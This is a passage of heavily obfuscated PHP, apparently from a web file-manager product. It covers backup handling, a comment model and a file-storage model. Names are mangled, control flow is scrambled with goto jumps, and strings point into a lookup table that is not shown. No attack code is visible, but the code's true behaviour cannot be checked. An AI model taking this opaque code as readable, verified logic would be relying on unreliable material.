$Fæ¤åˆÁŠö = TEMP_FILES . $a„ÛŒß»××[712] . $a¨¶Ş±‚îÕ . $a„ÛŒß»××[8]; IO::remove($Fæ¤åˆÁŠö, !1); goto déÒäš‘·—; eá›‰Ö—ˆ: $a„ÛŒß»×× =& $_SERVER[í…¶]; $aÉÏäéºÂÆ = $this->listData($f²ò¥İä¯); if (!$aÉÏäéºÂÆ || empty($aÉÏäéºÂÆ[$a„ÛŒß»××[28]])) { return !0; } goto bê¦Ë« ô¼; déÒäš‘·—: return $this->remove($f²ò¥İä¯); goto E‹“±ˆŸñª; E‹“±ˆŸñª: } public function remove($E¦ÅÃ¸Ä‰¤) { $CÒªáÁÒğÛ = $this->listData($E¦ÅÃ¸Ä‰¤); if (!$CÒªáÁÒğÛ) { return !0; } return $this->backupRemove($CÒªáÁÒğÛ); } private function backupRemove($Fò¥ëÏ­ë‰) { $fÉó’ˆÄ— =& $_SERVER[í…¶]; parent::remove($Fò¥ëÏ­ë‰[$fÉó’ˆÄ—[376]]); $e¥»Á°â = "\173\x69\157\72{$Fò¥ëÏ­ë‰[$fÉó’ˆÄ—[693]]}\175\x2f\144\x61\x74\141\x62\x61\x73\x65\57\x62\x61\143\x6b\165\160\137" . $Fò¥ëÏ­ë‰[$fÉó’ˆÄ—[28]]; IO::remove($e¥»Á°â, !1); return !0; } public function start() { goto fÇÂ¨¸¿›Ù; CÜ·÷Î´©±: return !0; goto BÜ²Åä°ª¢; F³Ùòá‚¿Ç: if (!$c§Æ«Œ«êæ || $c§Æ«Œ«êæ[$C±Á‹‹„²Ù[1405]] != $C±Á‹‹„²Ù[83]) { return !1; } $AòŸ‹ èï = $this->process(); foreach ($AòŸ‹ èï as $aøä½ëùÆÎ) { if ($aøä½ëùÆÎ) { return Task::restart($aøä½ëùÆÎ[$C±Á‹‹„²Ù[376]]); } } goto Dó¯ÌöÙ˜´; fÇÂ¨¸¿›Ù: $C±Á‹‹„²Ù =& $_SERVER[í…¶]; if ($GLOBALS[$C±Á‹‹„²Ù[6]][$C±Á‹‹„²Ù[84]][$C±Á‹‹„²Ù[2126]] != $C±Á‹‹„²Ù[83]) { return !0; } $c§Æ«Œ«êæ = $this->config(); goto F³Ùòá‚¿Ç; A†ÀçáëÈÍ: if (!$aÃ˜‡ŞÉ¾Ï->dbFile()) { return !1; } if ($c§Æ«Œ«êæ[$C±Á‹‹„²Ù[694]] == $C±Á‹‹„²Ù[477]) { $aÃ˜‡ŞÉ¾Ï->file(); } Backup::set(array($C±Á‹‹„²Ù[691] => 1, $C±Á‹‹„²Ù[705] => time())); goto CÜ·÷Î´©±; Dó¯ÌöÙ˜´: $aÃ˜‡ŞÉ¾Ï = new Backup(); $aÃ˜‡ŞÉ¾Ï->keep(); if (!$aÃ˜‡ŞÉ¾Ï->db()) { return !1; } goto A†ÀçáëÈÍ; BÜ²Åä°ª¢: } public function process() { $b…ÇØƒÒõ¬ =& $_SERVER[í…¶]; return array($b…ÇØƒÒõ¬[696] => Task::get($b…ÇØƒÒõ¬[715]), $b…ÇØƒÒõ¬[699] => Task::get($b…ÇØƒÒõ¬[731]), $b…ÇØƒÒõ¬[167] => Task::get($b…ÇØƒÒõ¬[739])); } public function restore() { $bÈç¿ÊîÈµ =& $_SERVER[í…¶]; ActionCall($bÈç¿ÊîÈµ[2127], !0, 1); ActionCall($bÈç¿ÊîÈµ[2127], !0, 0); } } goto A­¶¦¿Ÿ‡¥; F‰‹ˆ‘†Ïî: define($_SERVER[í…¶][227], 2); define($_SERVER[í…¶][228], 3); define($_SERVER[í…¶][229], 1); goto Aø¹ñ”Ë´; A­¶¦¿Ÿ‡¥: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\156\164"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\141\x6d\x65" => "\x63\157\155\x6d\x65\x6e\164\137\x6d\145\x74\141", "\155\x65\x74\x61\106\x69\x65\154\144" => "\143\x6f\x6d\x6d\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($DÊõÎ²†Ş¡) { $aµí£ø›’ =& $_SERVER[í…¶]; if ($DÊõÎ²†Ş¡[$aµí£ø›’[2128]]) { $f°ƒæ•ÌÚ = $this->where(array($aµí£ø›’[2129] => $DÊõÎ²†Ş¡[$aµí£ø›’[2128]]))->find(); if (!$f°ƒæ•ÌÚ || $f°ƒæ•ÌÚ[$aµí£ø›’[380]] != $DÊõÎ²†Ş¡[$aµí£ø›’[380]] || $f°ƒæ•ÌÚ[$aµí£ø›’[465]] != $DÊõÎ²†Ş¡[$aµí£ø›’[465]]) { return !1; } $this->where(array($aµí£ø›’[2129] => $DÊõÎ²†Ş¡[$aµí£ø›’[2128]]))->setAdd($aµí£ø›’[2130], 1); } return $this->add($DÊõÎ²†Ş¡); } public function remove($cÙ¸¶¿÷ÑÈ) { $a£ğ¤³ø…Ù =& $_SERVER[í…¶]; $B†æ¦¼°ï‘ = array($a£ğ¤³ø…Ù[2129] => $cÙ¸¶¿÷ÑÈ); $A«àİš‚‰æ = $this->where($B†æ¦¼°ï‘)->find(); if ($A«àİš‚‰æ[$a£ğ¤³ø…Ù[2128]]) { $this->where(array($a£ğ¤³ø…Ù[2129] => $A«àİš‚‰æ[$a£ğ¤³ø…Ù[2128]]))->setAdd($a£ğ¤³ø…Ù[2130], -1); } return $this->where($B†æ¦¼°ï‘)->delete(); } public function edit($Dêºµ‡¤ãö, $a‡´Ÿˆš…) { $DÏª–ªù‚’ =& $_SERVER[í…¶]; $Bç†ƒÑÃä  = array($DÏª–ªù‚’[2129] => $Dêºµ‡¤ãö); return $this->where($Bç†ƒÑÃä )->save(array($DÏª–ªù‚’[2131] => $a‡´Ÿˆš…)); } public function prasise($a§²‹ŸÚ…) { $fğïÇ·» =& $_SERVER[í…¶]; $FˆØÃ²Î’¸ = Model($fğïÇ·»[2132]); $AÕó‰†‘ ö = array($fğïÇ·»[2129] => $a§²‹ŸÚ…, $fğïÇ·»[1424] => USER_ID); $aà¢‰±Ù£â = $FˆØÃ²Î’¸->where($AÕó‰†‘ ö)->find(); if (!$aà¢‰±Ù£â) { $FˆØÃ²Î’¸->add($AÕó‰†‘ ö); $EÛ–±ËçäŞ = $this->where(array($fğïÇ·»[2129] => $a§²‹ŸÚ…))->setAdd($fğïÇ·»[2133], 1); } else { $FˆØÃ²Î’¸->where($AÕó‰†‘ ö)->delete(); $EÛ–±ËçäŞ = $this->where(array($fğïÇ·»[2129] => $a§²‹ŸÚ…))->setAdd($fğïÇ·»[2133], -1); } return $EÛ–±ËçäŞ; } public function targetInfo($D¥ Å¦”¶š, $C÷ÚêÁ«¡Ï) { goto CÅ¿†åå¹; CÅ¿†åå¹: $EÉ¯¾±è‡¸ =& $_SERVER[í…¶]; $dÆ¹Ğºì©ò = array($EÉ¯¾±è‡¸[530] => $D¥ Å¦”¶š, $EÉ¯¾±è‡¸[531] => $C÷ÚêÁ«¡Ï); $BÃÒçïäöĞ = $this->where($dÆ¹Ğºì©ò)->count(); goto bõÚãÕá–…; fà‘ÁÌÉâÕ: return $A’Ü¾¢ÃÎ; goto a´™œµ¹¼; bõÚãÕá–…: $e“ºùÕ–Ä¢ = "\x52\111\107\110\124\x20\112\x4f\111\116\40{$this->tablePrefix}\143\x6f\155\155\145\156\164\x5f\x70\x72\x61\151\163\145\40\x73\x74\x61\x72\40\x6f\156\x20\x63\157\x6d\x6d\145\156\164\56\x63\157\x6d\x6d\x65\x6e\x74\111\x44\x20\75\x20\x73\164\141\x72\56\143\157\x6d\155\x65\x6e\x74\x49\104"; $B†”ÎÜá¨ù = $this->alias($EÉ¯¾±è‡¸[341])->where($dÆ¹Ğºì©ò)->join($e“ºùÕ–Ä¢, $EÉ¯¾±è‡¸[2134])->count(); $A’Ü¾¢ÃÎ = array($EÉ¯¾±è‡¸[2135] => $BÃÒçïäöĞ, $EÉ¯¾±è‡¸[2136] => $B†”ÎÜá¨ù); goto fà‘ÁÌÉâÕ; a´™œµ¹¼: } public function listData($AªïæÄïİ) { $Aòˆñ…ç†Â =& $_SERVER[í…¶]; if (isset($AªïæÄïİ[$Aòˆñ…ç†Â[2137]])) { if ($AªïæÄïİ[$Aòˆñ…ç†Â[2137]]) { $AªïæÄïİ[$Aòˆñ…ç†Â[2138]] = array($Aòˆñ…ç†Â[926], intval($AªïæÄïİ[$Aòˆñ…ç†Â[2137]])); } unset($AªïæÄïİ[$Aòˆñ…ç†Â[2137]]); } if (isset($AªïæÄïİ[$Aòˆñ…ç†Â[2139]])) { if ($AªïæÄïİ[$Aòˆñ…ç†Â[2139]]) { $AªïæÄïİ[$Aòˆñ…ç†Â[2138]] = array($Aòˆñ…ç†Â[923], intval($AªïæÄïİ[$Aòˆñ…ç†Â[2139]])); } unset($AªïæÄïİ[$Aòˆñ…ç†Â[2139]]); } return $this->_listData($AªïæÄïİ); } private function _listData($Fƒ¨äé”öÄ) { $A×š©ê–³ =& $_SERVER[í…¶]; $e“†Íì£»˜ = $this->where($Fƒ¨äé”öÄ)->_makeOrder()->selectPage(100); $this->_listAppendParent($e“†Íì£»˜[$A×š©ê–³[363]]); $this->_listAppendUser($e“†Íì£»˜[$A×š©ê–³[363]]); $this->_listAppendMeta($e“†Íì£»˜[$A×š©ê–³[363]]); return $e“†Íì£»˜; } private function _makeOrder() { $D»¬—Ã‡Õ¨ =& $_SERVER[í…¶]; $BáÉ‰ê©®– = array($D»¬—Ã‡Õ¨[2133], $D»¬—Ã‡Õ¨[2130], $D»¬—Ã‡Õ¨[187]); $AÄğÆœ¹®¦ = Input::get($D»¬—Ã‡Õ¨[416], $D»¬—Ã‡Õ¨[7], $D»¬—Ã‡Õ¨[398], $BáÉ‰ê©®–); $b˜¢ŒóÂ‚Ó = Input::get($D»¬—Ã‡Õ¨[417], $D»¬—Ã‡Õ¨[7], $D»¬—Ã‡Õ¨[1426], array($D»¬—Ã‡Õ¨[2140], $D»¬—Ã‡Õ¨[414])); $E§ñ©âäéµ = $AÄğÆœ¹®¦ . $D»¬—Ã‡Õ¨[50] . $b˜¢ŒóÂ‚Ó; return $this->order($E§ñ©âäéµ); } private function _listAppendParent(&$B¹Ñ…Ÿò½) { goto dòÎùë¦–; c½ŸåÔ²îØ: foreach ($B¹Ñ…Ÿò½ as &$E…Ôğ¹é©µ) { if (isset($E“Õà­Ã[$E…Ôğ¹é©µ[$b™§‘†Š¸®[2128]]])) { $E…Ôğ¹é©µ[$b™§‘†Š¸®[2141]] = $E“Õà­Ã[$E…Ôğ¹é©µ[$b™§‘†Š¸®[2128]]]; } } goto b¡­İÊµù×; a¨¶Ÿ¸è»: if (!$bÊ„¥Ùõ¶”) { return; } $E“Õà­Ã = $this->where(array($b™§‘†Š¸®[2129] => array($b™§‘†Š¸®[7], $bÊ„¥Ùõ¶”)))->select(); $E“Õà­Ã = array_to_keyvalue($E“Õà­Ã, $b™§‘†Š¸®[2138]); goto c½ŸåÔ²îØ; dòÎùë¦–: $b™§‘†Š¸® =& $_SERVER[í…¶]; $bÊ„¥Ùõ¶” = array_unique(array_to_keyvalue($B¹Ñ…Ÿò½, $b™§‘†Š¸®[33], $b™§‘†Š¸®[2128])); $bÊ„¥Ùõ¶” = array_remove_value($bÊ„¥Ùõ¶”, $b™§‘†Š¸®[477]); goto a¨¶Ÿ¸è»; b¡­İÊµù×: } private function _listAppendUser(&$E·Ú‡ØÜõ) { goto Bá±›œ÷; Bá±›œ÷: $d‡ëš…±ÔÜ =& $_SERVER[í…¶]; $EŒÉ´ùŠä = array_unique(array_to_keyvalue($E·Ú‡ØÜõ, $d‡ëš…±ÔÜ[33], $d‡ëš…±ÔÜ[1433])); $EŒÉ´ùŠä = array_remove_value($EŒÉ´ùŠä, $d‡ëš…±ÔÜ[477]); goto F´Ì¿ëƒŸÌ; DÊ¡œ®åÔ: foreach ($E·Ú‡ØÜõ as &$Fğƒ´¨£òà) { $Fğƒ´¨£òà[$d‡ëš…±ÔÜ[544]] = $Fô•ßƒºÄâ[$Fğƒ´¨£òà[$d‡ëš…±ÔÜ[1433]]]; if (isset($Fğƒ´¨£òà[$d‡ëš…±ÔÜ[2141]])) { $Fğƒ´¨£òà[$d‡ëš…±ÔÜ[2141]][$d‡ëš…±ÔÜ[544]] = $Fô•ßƒºÄâ[$Fğƒ´¨£òà[$d‡ëš…±ÔÜ[2141]][$d‡ëš…±ÔÜ[1433]]]; } } goto Fã©˜Ù²å; F´Ì¿ëƒŸÌ: if (count($EŒÉ´ùŠä) == 0) { return; } foreach ($E·Ú‡ØÜõ as $Fğƒ´¨£òà) { if (isset($Fğƒ´¨£òà[$d‡ëš…±ÔÜ[2141]])) { $EŒÉ´ùŠä[] = $Fğƒ´¨£òà[$d‡ëš…±ÔÜ[2141]][$d‡ëš…±ÔÜ[1433]]; } } $Fô•ßƒºÄâ = Model($d‡ëš…±ÔÜ[486])->userListInfo($EŒÉ´ùŠä); goto DÊ¡œ®åÔ; Fã©˜Ù²å: } private function _listAppendMeta(&$c­Ü‰À‹Êˆ) { goto Få†Ç´óì; Få†Ç´óì: $dî±ïçÎ¿‡ =& $_SERVER[í…¶]; $FÄÊ“‚ÒØÊ = array_unique(array_to_keyvalue($c­Ü‰À‹Êˆ, $dî±ïçÎ¿‡[33], $dî±ïçÎ¿‡[2138])); $FÄÊ“‚ÒØÊ = array_remove_value($FÄÊ“‚ÒØÊ, $dî±ïçÎ¿‡[477]); goto d»¯Øï«ã–; d»¯Øï«ã–: if (!$FÄÊ“‚ÒØÊ) { return; } foreach ($c­Ü‰À‹Êˆ as $d¶»Ï‡Ö°Ù) { if (isset($d¶»Ï‡Ö°Ù[$dî±ïçÎ¿‡[2141]])) { $FÄÊ“‚ÒØÊ[] = $d¶»Ï‡Ö°Ù[$dî±ïçÎ¿‡[2141]][$dî±ïçÎ¿‡[2138]]; } } $aÖÎ¨£é½„ = $this->metaList($FÄÊ“‚ÒØÊ); goto E³‚Óâ²‚•; E³‚Óâ²‚•: if (!$aÖÎ¨£é½„) { return !1; } foreach ($c­Ü‰À‹Êˆ as &$d¶»Ï‡Ö°Ù) { $d¶»Ï‡Ö°Ù[$dî±ïçÎ¿‡[426]] = $aÖÎ¨£é½„[$d¶»Ï‡Ö°Ù[$dî±ïçÎ¿‡[2138]]]; if (isset($d¶»Ï‡Ö°Ù[$dî±ïçÎ¿‡[2141]])) { $d¶»Ï‡Ö°Ù[$dî±ïçÎ¿‡[2141]][$dî±ïçÎ¿‡[426]] = $aÖÎ¨£é½„[$d¶»Ï‡Ö°Ù[$dî±ïçÎ¿‡[2141]][$dî±ïçÎ¿‡[2138]]]; } } goto a‡×¼‰ÛßÌ; a‡×¼‰ÛßÌ: } private function metaList($C¸Îë˜– £) { goto FÙ İè÷Ó; b®ŸåÆĞöƒ: return $C´²Îˆïè¬ ? $C´²Îˆïè¬ : array(); goto fŸ²Ì½âò; FğŠö™ÑŸ: $C´²Îˆïè¬ = Model($Cä›‡ƒÍöª[2142])->where($f‰â‹–äÄì)->select(); $C´²Îˆïè¬ = array_to_keyvalue_group($C´²Îˆïè¬, $Cä›‡ƒÍöª[2138]); foreach ($C´²Îˆïè¬ as $fìµÛÔ„Â => $cò‚˜³³œå) { $cèÙ²ÀëãÃ = array(); foreach ($cò‚˜³³œå as $D§„õ«ëŞª) { $cèÙ²ÀëãÃ[$D§„õ«ëŞª[$Cä›‡ƒÍöª[89]]] = $D§„õ«ëŞª[$Cä›‡ƒÍöª[368]]; } $C´²Îˆïè¬[$fìµÛÔ„Â] = $cèÙ²ÀëãÃ; } goto b®ŸåÆĞöƒ; FÙ İè÷Ó: $Cä›‡ƒÍöª =& $_SERVER[í…¶]; if (!$C¸Îë˜– £) { return array(); } $f‰â‹–äÄì = array($Cä›‡ƒÍöª[2138] => array($Cä›‡ƒÍöª[7], $C¸Îë˜– £)); goto FğŠö™ÑŸ; fŸ²Ì½âò: } } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\x6c\x65"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\155\x65" => "\151\x6f\137\146\x69\154\x65\137\x6d\145\164\141", "\155\x65\164\141\106\x69\145\x6c\144" => "\x66\x69\x6c\145\111\104"); public function fileInfo($díòÓ”ëˆì) { $F­‹Ëİœ±¿ =& $_SERVER[í…¶]; static $B¥ÔŒ‰ñè§ = array(); if (!isset($B¥ÔŒ‰ñè§[$díòÓ”ëˆì])) { $d­¹“µ‘ñá = $F­‹Ëİœ±¿[2143]; $a©©„å­¯˜ = Model($F­‹Ëİœ±¿[431])->field($d­¹“µ‘ñá)->where(array($F­‹Ëİœ±¿[429] => $díòÓ”ëˆì))->find(); $B¥ÔŒ‰ñè§[$díòÓ”ëˆì] = $a©©„å­¯˜; } return $B¥ÔŒ‰ñè§[$díòÓ”ëˆì]; } public function addFileByContent($EÈÙÓ‚Üâµ = '', $e„ƒ·”ó±ë = '') { goto cÆÃ¡ÃËˆ; cÆÃ¡ÃËˆ: $cù»íá‚›¬ =& $_SERVER[í…¶]; $b¡ƒïš™² = TEMP_PATH . $cù»íá‚›¬[2144]; if (!is_dir($b¡ƒïš™²)) { mk_dir($b¡ƒïš™²); } goto d›ˆ¹ Åã°; aš–çÛ¹ãÏ: if (file_exists($DÒ¶—„ƒğÇ)) { @unlink($DÒ¶—„ƒğÇ); } return $a•…‡×Á¯; goto B‡¬Ï‹Ò; d›ˆ¹ Åã°: $DÒ¶—„ƒğÇ = $b¡ƒïš™² . $cù»íá‚›¬[2145] . rand_string(16); file_put_contents($DÒ¶—„ƒğÇ, $EÈÙÓ‚Üâµ); $a•…‡×Á¯ = $this->addFile($DÒ¶—„ƒğÇ, $e„ƒ·”ó±ë, !0); goto aš–çÛ¹ãÏ; B‡¬Ï‹Ò: } public function createFileName($DŒİê¤ë£¥) { goto A³“ŠŒ‹õ¾; E²©š›Ô¡õ: if (!$eŠØ…çÀ–É && !Cache::get($B‡ŸãôÁÌ½)) { $eŠØ…çÀ–É = !0; $fÖí¿å™ã£ = IO::mkdir($fÎ¹îÓªâ); if (!IO::exist($fÖí¿å™ã£ . $Aê£åÓˆù[2147])) { IO::mkfile($fÖí¿å™ã£ . $Aê£åÓˆù[2147]); } Cache::set($B‡ŸãôÁÌ½, 1, 3600 * 2); } return $EÉÚÙÛç; goto Dù‡£›œ”; A³“ŠŒ‹õ¾: $Aê£åÓˆù =& $_SERVER[í…¶]; $F…³µ—ŒŒÍ = IO::init($Aê£åÓˆù[8]); $EÉÚÙÛç = $this->makeFilePath($DŒİê¤ë£¥, $F…³µ—ŒŒÍ); goto A‘ªîÃ¦“; A‘ªîÃ¦“: $fÎ¹îÓªâ = $F…³µ—ŒŒÍ->pathFather($EÉÚÙÛç); static $eŠØ…çÀ–É = false; $B‡ŸãôÁÌ½ = $Aê£åÓˆù[2146] . md5($fÎ¹îÓªâ); goto E²©š›Ô¡õ; Dù‡£›œ”: } public function makeFilePath($B«–Õ¯¬î‰, $E¢ˆæá×°) { goto câØƒ³ÜÆ÷; fà¨Óß”¾‰: switch ($cì¡«Şß™©) { case $EÀÈÈâÑó[2151]: $c‹ÚÏ‹…­ˆ = $c‹ÚÏ‹…­ˆ . $EÀÈÈâÑó[91] . $E¢ˆæá×°->ext($B«–Õ¯¬î‰); if ($E¢ˆæá×°->ext($B«–Õ¯¬î‰) == $EÀÈÈâÑó[2091]) { $c‹ÚÏ‹…­ˆ .= $EÀÈÈâÑó[2152]; } break; case $EÀÈÈâÑó[2153]: goto fÛ¥ÀİàÔå; C¹ù‘´ÜĞê: break; goto B¯ùÊˆ†ê; fÛ¥ÀİàÔå: $c÷ä—ˆÓø‘ = Model($EÀÈÈâÑó[1086])->get($EÀÈÈâÑó[1332]); $F“›ºÆ­™ = substr(md5($EÀÈÈâÑó[1910] . $c÷ä—ˆÓø‘ . date($EÀÈÈâÑó[689])), 0, 8); $eÈáõ¼ğ—‡ = KodIO::defaultIO() . date($EÀÈÈâÑó[2154]) . $F“›ºÆ­™ . $EÀÈÈâÑó[8]; goto e™Ô¢Ÿ¸Óä; e™Ô¢Ÿ¸Óä: if ($E¢ˆæá×°->ext($B«–Õ¯¬î‰) == $EÀÈÈâÑó[2091]) { $B«–Õ¯¬î‰ .= $EÀÈÈâÑó[2152]; } $f¢ôá¯ÚŸŠ = IO::fileNameAuto($eÈáõ¼ğ—‡, $B«–Õ¯¬î‰); $c‹ÚÏ‹…­ˆ = $eÈáõ¼ğ—‡ . $f¢ôá¯ÚŸŠ; goto C¹ù‘´ÜĞê; B¯ùÊˆ†ê: case $EÀÈÈâÑó[2150]: break; default: break; } return $c‹ÚÏ‹…­ˆ; goto dÉæÂ¿‡«; câØƒ³ÜÆ÷: $EÀÈÈâÑó =& $_SERVER[í…¶]; $cì¡«Şß™© = Model($EÀÈÈâÑó[1086])->get($EÀÈÈâÑó[2148]); $eÈáõ¼ğ—‡ = KodIO::defaultIO() . date($EÀÈÈâÑó[2149]); goto Fø—‘¥½ù¶; Fø—‘¥½ù¶: $c‹ÚÏ‹…­ˆ = $eÈáõ¼ğ—‡ . rand_string(5) . short_id(100); $B«–Õ¯¬î‰ = str_replace($EÀÈÈâÑó[8], $EÀÈÈâÑó[70], KodIO::clear($B«–Õ¯¬î‰)); if (!$B«–Õ¯¬î‰) { $cì¡«Şß™© = $EÀÈÈâÑó[2150]; } goto fà¨Óß”¾‰; dÉæÂ¿‡«: } public function addFileByRemote($a‚Æİì¡µ, $DË†ùƒƒÅ¯, $e‘î¤ŠÔ…§ = array()) { goto f¼¡ã¯“µ; fßÎ‰ï°Ã: $e¼ö¾§Òšó = IO::hashMd5($a‚Æİì¡µ, $cË‚Ô™ŒÜÀ); $Aª¨½¬´£À = KodIO::defaultDriver(); $cÚöÂ°¯ğ = array($fÆŠÈÃ§‰É[529] => IO::size($a‚Æİì¡µ), $fÆŠÈÃ§‰É[2155] => 1, $fÆŠÈÃ§‰É[395] => $DË†ùƒƒÅ¯, $fÆŠÈÃ§‰É[738] => $Aª¨½¬´£À[$fÆŠÈÃ§‰É[376]], $fÆŠÈÃ§‰É[396] => $a‚Æİì¡µ, $fÆŠÈÃ§‰É[2156] => $e‘î¤ŠÔ…§[$fÆŠÈÃ§‰É[164]] ? $e‘î¤ŠÔ…§[$fÆŠÈÃ§‰É[164]] : IO::hashSimple($a‚Æİì¡µ), $fÆŠÈÃ§‰É[2157] => $e¼ö¾§Òšó ? $e¼ö¾§Òšó : $cË‚Ô™ŒÜÀ); goto dä…­§‹‡; dä…­§‹‡: if ($dõÔáĞœÎ¡ = $this->addFileCheckExist($cÚöÂ°¯ğ[$fÆŠÈÃ§‰É[164]], $cÚöÂ°¯ğ[$fÆŠÈÃ§‰É[163]], $cÚöÂ°¯ğ[$fÆŠÈÃ§‰É[77]])) { return $dõÔáĞœÎ¡; } return $this->addFileData($cÚöÂ°¯ğ); goto Ešˆ—Ù™Ãˆ; f¼¡ã¯“µ: $fÆŠÈÃ§‰É =& $_SERVER[í…¶]; if (!IO::exist($a‚Æİì¡µ)) { return !1; } $cË‚Ô™ŒÜÀ = $e‘î¤ŠÔ…§[$fÆŠÈÃ§‰É[163]] ? $e‘î¤ŠÔ…§[$fÆŠÈÃ§‰É[163]] : $fÆŠÈÃ§‰É[33]; goto fßÎ‰ï°Ã; Ešˆ—Ù™Ãˆ: } private function addFileData($Fùá×Š‰‹) { $B‰Ê‚ÉÒéÊ =& $_SERVER[í…¶]; if (!$Fùá×Š‰‹) { return !1; } $Fùá×Š‰‹[$B‰Ê‚ÉÒéÊ[77]] = intval($Fùá×Š‰‹[$B‰Ê‚ÉÒéÊ[77]]); if (!$Fùá×Š‰‹[$B‰Ê‚ÉÒéÊ[77]] && strlen($Fùá×Š‰‹[$B‰Ê‚ÉÒéÊ[164]]) > 32) { $Fùá×Š‰‹[$B‰Ê‚ÉÒéÊ[77]] = intval(substr($Fùá×Š‰‹[$B‰Ê‚ÉÒéÊ[164]], 32)); } $aÔØ”¦ïÁ¨ = $this->add($Fùá×Š‰‹); return $this->find($aÔØ”¦ïÁ¨); } public function addFile($d™Ü¤–áÙ, $b–£ŞÂŒ¼, $eÚÊ‹Éø‘§ = false) { $Cª™ã±™Â® = IO::hashSimple($d™Ü¤–áÙ); $fÒµæ¿‡á = IO::hashMd5($d™Ü¤–áÙ); $A¹Ìò–³ïã = IO::size($d™Ü¤–áÙ); if ($B¥ì”ë¹¦‰ = $this->addFileCheckExist($Cª™ã±™Â®, $fÒµæ¿‡á, $A¹Ìò–³ïã)) { return $B¥ì”ë¹¦‰; } $b÷“³®–ë = $this->addFileMake($d™Ü¤–áÙ, $A¹Ìò–³ïã, $Cª™ã±™Â®, $fÒµæ¿‡á, $b–£ŞÂŒ¼, $eÚÊ‹Éø‘§); return $this->addFileData($b÷“³®–ë); } public function addFileMake($cëÏùŒ×ÖÔ, $BÕªìª‰„š, $eâöøèŠ‘Õ, $cÁ‡ØØÀ·, $A·à¼ÜÖÖ”, $aéˆ©ç«®) { goto aÖ¡‹ÌØœ¤; aÖ¡‹ÌØœ¤: $b„ó–éßÚî =& $_SERVER[í…¶]; $Bº¿ÄÛÓ§Á = $this->createFileName($A·à¼ÜÖÖ”); $AˆİŠÅ¥‘¯ = get_path_father($Bº¿ÄÛÓ§Á); goto d‡àôöß³; Cô†ØÉ¼ÂÃ: $F¥…ª´¯­Ô = KodIO::defaultDriver(); $aÊ…Ö²‰ªá = array($b„ó–éßÚî[529] => $BÕªìª‰„š, $b„ó–éßÚî[2155] => 1, $b„ó–éßÚî[395] => $A·à¼ÜÖÖ”, $b„ó–éßÚî[738] => $F¥…ª´¯­Ô[$b„ó–éßÚî[376]], $b„ó–éßÚî[396] => $Bº¿ÄÛÓ§Á, $b„ó–éßÚî[2156] => $eâöøèŠ‘Õ, $b„ó–éßÚî[2157] => $cÁ‡ØØÀ·); return $aÊ…Ö²‰ªá; goto eâôÚÚğ¨Ñ; d‡àôöß³: $a÷Ê©œîÖ = get_path_this($Bº¿ÄÛÓ§Á); if ($aéˆ©ç«®) { $A°ößä›™ = IO::move($cëÏùŒ×ÖÔ, $AˆİŠÅ¥‘¯, !1, $a÷Ê©œîÖ); } else { $A°ößä›™ = IO::copy($cëÏùŒ×ÖÔ, $AˆİŠÅ¥‘¯, !1, $a÷Ê©œîÖ); } if (!$A°ößä›™) { return !1; } goto Cô†ØÉ¼ÂÃ; eâôÚÚğ¨Ñ: } public function addFileCheckExist($CÜ³ùèáÙŠ, $dåŠ…ƒÓ, $e‡ãÀ‡Ê¢­) { $bˆï±à’‘‡ =& $_SERVER[í…¶]; $fè®ùá’¦” = $this->findByHash($CÜ³ùèáÙŠ, $dåŠ…ƒÓ); if (!$fè®ùá’¦”) { return !1; } $b“ê†·Öø = array($bˆï±à’‘‡[2155] => intval($fè®ùá’¦”[$bˆï±à’‘‡[2158]]) + 1, $bˆï±à’‘‡[529] => $e‡ãÀ‡Ê¢­); $this->where(array($bˆï±à’‘‡[429] => $fè®ùá’¦”[$bˆï±à’‘‡[428]]))->save($b“ê†·Öø); return $fè®ùá’¦”; } public function remove($E’«ù¾Ï ø) { $this->linkCountChange($E’«ù¾Ï ø, !1); $this->clearEmpty(); return !0; } public function linkAdd($BÕ°à›™‹°) { $this->linkCountChange($BÕ°à›™‹°, !0); } public function linkCountChange($B¸ó÷ªˆ¯÷, $dí¨Â¼—°õ) { goto fĞé–Ó‚®Ó; fĞé–Ó‚®Ó: $B‚Ÿ´æÈµ =& $_SERVER[í…¶]; if (!$B¸ó÷ªˆ¯÷) { return; } if (!is_array($B¸ó÷ªˆ¯÷)) { $B¸ó÷ªˆ¯÷ = array($B¸ó÷ªˆ¯÷); } goto fİ¾—Û»¼°; D­¦»‚¢›: foreach ($a²¼¹¤æ…Ó as $D”É×—àò“ => $e’Ú·ÏÚ•¾) { $dá†•Í¨¿ = $e’Ú·ÏÚ•¾ . $B‚Ÿ´æÈµ[33]; if (!$B£›àˆÏ [$dá†•Í¨¿]) { $B£›àˆÏ [$dá†•Í¨¿] = array(); } $B£›àˆÏ [$dá†•Í¨¿][] = $D”É×—àò“; } foreach ($B£›àˆÏ  as $e’Ú·ÏÚ•¾ => $fÎİì£¯Îå) { if (!$fÎİì£¯Îå) { continue; } $e’Ú·ÏÚ•¾ = $dí¨Â¼—°õ ? $e’Ú·ÏÚ•¾ : -intval($e’Ú·ÏÚ•¾); $FåùàŠë¢‡ = array($B‚Ÿ´æÈµ[428] => array($B‚Ÿ´æÈµ[7], $fÎİì£¯Îå)); if ($e’Ú·ÏÚ•¾ < 0) { $FåùàŠë¢‡[$B‚Ÿ´æÈµ[2158]] = array($B‚Ÿ´æÈµ[927], abs($e’Ú·ÏÚ•¾)); } $this->where($FåùàŠë¢‡)->setAdd($B‚Ÿ´æÈµ[2158], $e’Ú·ÏÚ•¾); } goto c©Éì“é¤; fİ¾—Û»¼°: $a²¼¹¤æ…Ó = array(); foreach ($B¸ó÷ªˆ¯÷ as $D”É×—àò“) { $dá†•Í¨¿ = $D”É×—àò“ . $B‚Ÿ´æÈµ[33]; if (!$a²¼¹¤æ…Ó[$dá†•Í¨¿]) { $a²¼¹¤æ…Ó[$dá†•Í¨¿] = 0; } $a²¼¹¤æ…Ó[$dá†•Í¨¿]++; } $B£›àˆÏ  = array(); goto D­¦»‚¢›; c©Éì“é¤: } public function findByHash($eŠ…µÖŸÏ, $Aî…„ÔÛ „ = false) { $fÉÎäÏËË =& $_SERVER[í…¶]; if 